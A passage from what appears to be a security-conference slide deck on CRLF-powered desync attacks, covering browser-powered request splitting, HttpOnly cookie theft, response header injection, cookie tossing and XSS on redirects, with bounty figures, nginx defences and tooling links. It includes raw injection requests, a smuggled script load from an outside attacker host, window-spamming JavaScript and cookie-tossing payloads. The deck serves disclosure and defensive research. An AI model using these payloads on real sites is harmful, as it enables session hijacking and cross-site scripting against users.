## Browser-Powered Request Splitting - Iframe Madness

https://attacker.com

</> </> </> </>
</> </> </> </>

## Slide 79

## Browser-Powered Request Splitting - Iframe Madness

https://attacker.com

</> </> </> </>
</> </> </> </>

## Slide 80

## Browser-Powered Request Splitting - Iframe Madness

https://attacker.com

</> </> </> </>
XSS </> </> </>

By tweaking how fast we create and delete iframes we can tune the RPS needed, triggering the XSS without crashing the browser tab

## Slide 81

## Browser-Powered Request Splitting

$3,255

```text
An embedded page at ids-proxy.account.[redacted].com says

{"account_type":"type1","user_image_url":null,"displayName":"Tobia Righi","session":"[redacted]na1.[redacted]YTBlZjBlYjktYWNi[redacted]RjA5NTU5NTI5RTdDMEE0OTVDNzBAQWRvYmVJRA",
"roles":[{"principal":"2C7CF09559529E7C0A495C70@WC...
```

Loading your profile...

Depends on weak SameSite cookie settings to work

Exploit takes ~10s. Chained with a CORS misconfig we could extract authentication tokens and victim’s PII **from the XSSed iframe.**

Credit: PortSwigger

## Slide 82

## Browser-Powered Request Splitting - Bypassing HttpOnly

```text
GET /api/footer§? HTTP/1.1

HEAD /abc HTTP/1.1
Host: accounts.shop.com

GET /static?<script/src=\\atk.cc/s.js> HTTP/1.1
Host: accounts.shop.com

GET / HTTP/1.1
Host: accounts.shop.com
X: x§ HTTP/2
Host: account.shop.com
Cookie: session=victim
```

```text
HTTP/1.1 200 OK
Content-Length 17982
Content-Type: text/html
Content-Length: 17982

HTTP/1.1 301 Moved Permanently
Location: /?<script/src=\\atk.cc/s.js>

...

...
```

## Slide 83

## Browser-Powered Request Splitting - Bypassing HttpOnly

```text
GET /api/footer§? HTTP/1.1

HEAD /abc HTTP/1.1
Host: accounts.shop.com

GET /static?<script/src=\\atk.cc/s.js> HTTP/1.1
Host: accounts.shop.com

GET /api/account HTTP/1.1
Host: accounts.shop.com
X: x§ HTTP/2
Host: account.shop.com
Cookie: session=victim
```

```text
HTTP/1.1 200 OK
Content-Length 17982
Content-Type: text/html
Content-Length: 17982

HTTP/1.1 301 Moved Permanently
Location: /?<script/src=\\atk.cc/s.js>

...

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: Session=victim; HttpOnly

{"email":"victim@gmail.com",... }
```

Victim’s session cookie reflected in **body**

## Slide 84

## Browser-Powered Request Splitting - Bypassing HttpOnly

https://attacker.com

```js
w = window.open(payload)
```

CLICK ME!

## Slide 85

## Browser-Powered Request Splitting - Bypassing HttpOnly

https://attacker.com

```js
w = window.open(payload)
```

CLICK ME!

https://accounts.shop.com/%3f%20%48%54%54%50

## Slide 86

## Browser-Powered Request Splitting - Bypassing HttpOnly

https://attacker.com

```js
w = window.open(payload)
w2 = window.open(payload)
```

CLICK ME!

https://accounts.shop.com/%3f%20%48%54%54%50

https://accounts.shop.com/%3f%20%48%54%54%50

## Slide 87

## Browser-Powered Request Splitting - Bypassing HttpOnly

https://attacker.com

```js
w = window.open(payload)
w2 = window.open(payload)

setInterval(() => {
    w.location = payload
    w2.location = payload
}, 1000)
```

CLICK ME!

https://accounts.shop.com/%3f%20%48%54%54%50

https://accounts.shop.com/%3f%20%48%54%54%50

## Slide 88

## Browser-Powered Request Splitting - Bypassing HttpOnly

https://attacker.com

```js
w = window.open(payload)
w2 = window.open(payload)

setInterval(() => {
    w.location = payload
    w2.location = payload
}, 1000)
```

CLICK ME!

https://accounts.shop.com/%3f%20%48%54%54%50

https://accounts.shop.com/%3f%20%48%54%54%50

```text
<script/src=\\atk.cc/s.js>


HTTP/1.1 200 OK
Set-Cookie: session=victim; HttpOnly
```

## Slide 89

## Browser-Powered Request Splitting - Bypassing HttpOnly

https://attacker.com

XSSed tab reads cookie from page content and exfils with postMessage, attack stops.

CLICK ME!

https://accounts.shop.com/%3f%20%48%54%54%50

https://accounts.shop.com/%3f%20%48%54%54%50

```text
<script/src=\\atk.cc/s.js>


HTTP/1.1 200 OK
Set-Cookie: session=victim; HttpOnly
```

$???

## Slide 90

# Response Header Injection

## Slide 91

## Response Header Injection

- Well known bug class often only really useful for client-side exploits
  - Cookie tossing
  - XSS (hard!)
  - Downgrading other security features with header overwrites or removals (gadgets)

```text
# nginx.conf
...
  location / {
    return 302 https://example.com$uri;
  }
```

```text
GET /%0d%0aX-In-Hdr:%201%0d%0a%0d%0a HTTP/1.1
Host: sub.example.com
```

```text
HTTP/1.1 302 Moved Temporarily
Server: nginx
Location: https://example.com/
X-In-Hdr: 1
```

## Slide 92

## Response Header Injection

- Well known bug class often only really useful for client-side exploits
  - Cookie tossing
  - XSS (hard!)
  - Downgrading other security features with header overwrites or removals (gadgets)

```text
# nginx.conf
...
  location / {
    return 302 https://example.com$uri;
  }
```

```text
GET /%0d%0aX-In-Hdr:%201%0d%0a%0d%0azzz HTTP/1.1
Host: sub.example.com
```

```text
HTTP/1.1 302 Moved Temporarily
Server: nginx
Location: https://example.com/
X-In-Hdr: 1

zzz
```

## Slide 93

## Cookie Tossing

```text
GET /%0d%0aSet-Cookie:%20Sess=abc%0d%0a%0d%0a HTTP/1.1
Host: www.doomscroll.com
```

```text
HTTP/1.1 302 Moved Temporarily
Location: /404?prev_url=/
Set-Cookie: Session=abc
```

- Allows us to set cookies into the victim’s browser.
  - Sensitive actions saved on attacker’s account
  - Cookie values embedded on page (XSS)
  - Target specific flows which are depended on certain cookies

## Slide 94

## Cookie Tossing - Major Social Media Platform

```text
GET /%0d%0aSet-Cookie:%20Session=attacker%20path%3D%2fdoomscroll%2fweb%2fproject%2fpost%2fv1%2f%3B%20domain%3Ddoomscroll.com%3B%20%0d%0aSet-Cookie:%20Session=attacker%20path%3D%2fapi%2fv1%2fvideo%2fupload%2fauth%2f%3B%20domain%3Ddoomscroll.com%3B%20%0d%0a%0d%0a HTTP/1.1
Host: www.doomscroll.com
```

```text
HTTP/1.1 302 Moved Temporarily
Location: /404?prev_url=/
Set-Cookie: Session=attacker path=/doomscroll/web/project/; domain=doomscroll.com;
Set-Cookie: Session=attacker path=/api/v1/video/upload/auth/; domain=doomscroll.com;

...
```

## Slide 95

## Cookie Tossing - Major Social Media Platform

$4,500

private

Session=attacker path=/doomscroll/web/project/post/v1/;
Session=attacker path=/api/v1/video/upload/auth/;

## Slide 96

## Cookie Tossing - Major Social Media Platform

$4,500

private

Session=attacker path=/doomscroll/web/project/post/v1/;
Session=attacker path=/api/v1/video/upload/auth/;

Attacker gains access to “private” video uploaded to their account

## Slide 97

## Response Header Injection to XSS

- XSS was really hard to achieve as in most cases we were always dealing with a 3xx response with a valid `Location` header.
- Our goal is to have the browser not redirect but instead process our injected body.

Injection occurs after path (no scheme change)

Second Location header is rejected by the browser

```text
HTTP/1.1 302 Moved Temporarily
Server: nginx
Location: https://example.com/

<script>alert(1)</script>
```

## Slide 98

## Hunting for special Origin Response Headers

- As part of our methodology we fuzzed for injected response headers that would cause whatever is in front of the Origin to apply transformations to the response.
- Collect headers from Akamai, AWS, Cloudflare, Azure and so on.

X-Edge-Function: drop_tables

Edge

## Slide 99

## XSS on a Redirect Response?

```text
/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>
```

```text
HTTP/1.1 301 Moved Permanently
Content-Length: 25
Server: nginx
Location: https://example.com/abc
CDN-Cache-Control: private="Location"

<script>alert(1)</script>
```

@joaxcar

## Slide 100

## XSS on a Redirect Response?

```text
/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>
```

https://sub.example.com

```text
HTTP/1.1 301 Moved Permanently
Content-Length: 27
Server: nginx
Location: https://example.com/abc
CDN-Cache-Control: private="Location"

<script>alert(1)</script>
```

@joaxcar

## Slide 101

## XSS on a Redirect Response?

```text
/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>
```

https://sub.example.com

```text
HTTP/1.1 301 Moved Permanently
Content-Length: 27
Server: cloudflare
CDN-Cache-Control: private="Location"

<script>alert(1)</script>
```

Location header stripped

## Slide 102

## XSS on a Redirect Response?

WAF

```text
/abc%0d%0aCDN-Cache-Control:%20private=%22Location%22%0d%0a%0d%0a<script>alert(1)</script>
```

https://sub.example.com

```text
HTTP/1.1 301 Moved Permanently
Content-Length: 27
Server: cloudflare
CDN-Cache-Control: private="Location"

<script>alert(1)</script>
```

## Slide 103

## XSS on a Redirect Response?

```text
%3C%73%63%72%1B%28%42%69%70%74%3E%61%6C%65%72%74%1B%28%42%28%31%1B%28%42%29%3C%2F%73%63%72%1B%28%42%69%70%74%3E
```

<script>alert(1)</script>

https://sub.example.com

sub.example.com
1
OK

```text
HTTP/1.1 301 Moved Permanently
Content-Length: 27
Server: cloudflare
CDN-Cache-Control: private="Location"
Content-Type: text/html; charset=ISO-2022-JP

<scr(Bipt>alert(B(1(B)</scr(Bipt>
```

$???

## Slide 104

## Response Splitting - Reverse Desync

Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics

Amit Klein - 2004

```text
GET /%0d%0aContent-Length:%200%0d%0a%0d%0a HTTP/1.1
Host: www.reverse.com
```

```text
HTTP/1.1 302 Moved Temporarily
Location: /home/index.html
Content-Length: 0

Connection: keep-alive

Moved Temporarily to /index.html
```

## Slide 105

## Response Splitting - Reverse Desync

Divide and Conquer: HTTP Response Splitting, Web Cache Poisoning Attacks, and Related Topics

Amit Klein - 2004

```text
GET /%0d%0aContent-Length:%200%0d%0a%0d%0a HTTP/1.1
Host: www.reverse.com
```

Making HTTP header injection critical via response queue poisoning

James Kettle - 2022

```text
HTTP/1.1 302 Moved Temporarily
Location: /home/index.html
Content-Length: 0

Connection: keep-alive

Moved Temporarily to /index.html
```

```text
GET /§
Content-Length: 0

HTTP/1.1 200 OK
Server: attacker
§ HTTP/1.1
Host: www.reverse.com
```

```text
HTTP/1.1 302 Moved Temporarily
Location: /home/index.html
Content-Length: 0

HTTP/1.1 200 OK
Server: attacker

Moved Temporarily to /index.html
```

Split into **two** responses

## Slide 106

## Coordinated Disclosure Process

$32,000

There’s lots more out there to be exploited. Bug bounty hunters do your thing

**Let us know in DMs!**

## Slide 107

## Defence

$request_uri

$uri

$document_uri

Use **HTTP/2**

```text
location ~ /docs/([^/\s]*)? { … $1 … }
```

Not a / and not whitespace

```text
location ~ /docs/([^/]*)? { … $1 … }
```

Matches on whitespace (including newlines)

## Slide 108

## Tooling & Materials

https://github.com/t0xodile/crlf-powered-desync-scanner

https://github.com/turtlesec-software/crlf-desyncs

## Slide 109

# Further Research

- Request header injection via non-path insertion points
- Reverse Desyncs via response header injection
- More methods of injecting headers rather than mutating them
- Mutated alternatives of the CRLF sequence

Lost In Translation: Exploiting Unicode Normalization

Ryan & Isabella Barnett - 2025

## Slide 110

# CRLF-Powered Desync Attacks

- Header injections are not a low-impact bug. See CRLF-Powered Desync Worm
- CRLF-Powered desyncs can achieve impact where other desync classes fail
- Desyncs from header injections aren't going anywhere while nginx exists

@t0xodile | @t0xodile.com
@m4st3rspl1nt3r | @turtlesec.io

https://turtlesec.io

## Slide 111

# CRLF-Powered Desync Attacks

https://turtlesec.io/blog/posts/crlf-powered-desync-attacks/

https://portswigger.net/research/crlf-powered-desync-attacks

@t0xodile | @t0xodile.com
@m4st3rspl1nt3r | @turtlesec.io

https://turtlesec.io

